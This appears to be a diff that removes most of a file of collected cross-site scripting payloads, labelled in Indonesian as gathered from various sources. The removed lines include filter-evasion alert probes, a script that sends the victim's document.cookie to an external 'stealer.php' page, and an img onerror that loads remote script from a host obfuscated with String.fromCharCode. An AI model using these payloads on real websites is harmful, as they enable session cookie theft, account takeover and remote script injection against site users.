@@ -6,21 +6,3 @@ If this bring benefit for you, Send me dua :)
 PAYLOAD XSS 
 PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
 -----------------------------------------------------------------------
- 
- javascri%0Dpt:alert/**/(1)
- <svg onload=alert(document.domain)>
-abc"><svg+onload=confirm(document.domain)>
-abc"><svg+onload=confirm(document.domain)>
-<script>alert(1)</script>
-<script>alert("xss bug input search by zhirobyte")</script>
-"><img src=x onerror=prompt(document.cookie)>
-
-<script type="text/javascript">
-document.location='https://zhirobyte.000webhostapp.com/stealer.php?c='+document.cookie;
-</script>
-
-<script type="text/javascript">
-<img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))>
-</script>
-
-javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
